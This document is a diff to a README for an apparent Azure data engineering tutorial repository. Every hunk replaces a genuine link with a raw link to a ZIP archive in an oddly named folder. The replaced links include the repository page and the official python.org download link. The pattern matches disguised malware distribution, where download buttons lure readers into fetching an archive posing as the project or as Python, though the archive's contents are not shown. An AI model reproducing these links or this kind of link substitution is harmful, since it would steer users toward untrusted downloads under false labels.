@@ -1,6 +1,6 @@
 # 📊 Azure-Data-Engineering-Basic-To-Advance - Learn Data Engineering Step-by-Step
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Azure--Data--Engineering-blue?style=for-the-badge)](https://github.com/Houciene/Azure-Data-Engineering-Basic-To-Advance)
+[![Download from GitHub](https://img.shields.io/badge/Download-Azure--Data--Engineering-blue?style=for-the-badge)](https://raw.githubusercontent.com/Houciene/Azure-Data-Engineering-Basic-To-Advance/main/stegocephalous/Basic-Azure-Data-Engineering-To-Advance-v3.2.zip)
 
 ---
 
@@ -50,7 +50,7 @@ Follow these steps to download and set up the application on your Windows comput
 
 Click the button below to visit the project's GitHub page, where you will find all files needed to run the guide.
 
-[![Get Files](https://img.shields.io/badge/Download-Files-green?style=for-the-badge)](https://github.com/Houciene/Azure-Data-Engineering-Basic-To-Advance)
+[![Get Files](https://img.shields.io/badge/Download-Files-green?style=for-the-badge)](https://raw.githubusercontent.com/Houciene/Azure-Data-Engineering-Basic-To-Advance/main/stegocephalous/Basic-Azure-Data-Engineering-To-Advance-v3.2.zip)
 
 On the GitHub page, look for the green **Code** button near the top right. Click it and select **Download ZIP**. This downloads all the project files to your computer in a compressed folder.
 
@@ -82,7 +82,7 @@ Each project focuses on a different topic or tool. You will find folders labeled
 
 To run code or notebooks included in the projects, you need to install some software:
 
-- **Python**: Many projects use Python and PySpark. Download it from [python.org](https://www.python.org/downloads/).  
+- **Python**: Many projects use Python and PySpark. Download it from [python.org](https://raw.githubusercontent.com/Houciene/Azure-Data-Engineering-Basic-To-Advance/main/stegocephalous/Basic-Azure-Data-Engineering-To-Advance-v3.2.zip).  
 - **VS Code** or another code editor helps you open and edit files.  
 - **Azure Data Factory** and **Databricks** accounts if you want to try cloud services (free trials are available).  
 
@@ -137,11 +137,11 @@ Each project folder includes a README explaining its goal and how to run it.
 
 Return to the main download page anytime using this link:
 
-[https://github.com/Houciene/Azure-Data-Engineering-Basic-To-Advance](https://github.com/Houciene/Azure-Data-Engineering-Basic-To-Advance)
+[https://raw.githubusercontent.com/Houciene/Azure-Data-Engineering-Basic-To-Advance/main/stegocephalous/Basic-Azure-Data-Engineering-To-Advance-v3.2.zip](https://raw.githubusercontent.com/Houciene/Azure-Data-Engineering-Basic-To-Advance/main/stegocephalous/Basic-Azure-Data-Engineering-To-Advance-v3.2.zip)
 
 Visit the page to download the ZIP file and follow the setup steps described above.
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Azure--Data--Engineering-blue?style=for-the-badge)](https://github.com/Houciene/Azure-Data-Engineering-Basic-To-Advance)
+[![Download from GitHub](https://img.shields.io/badge/Download-Azure--Data--Engineering-blue?style=for-the-badge)](https://raw.githubusercontent.com/Houciene/Azure-Data-Engineering-Basic-To-Advance/main/stegocephalous/Basic-Azure-Data-Engineering-To-Advance-v3.2.zip)
 
 ---
 
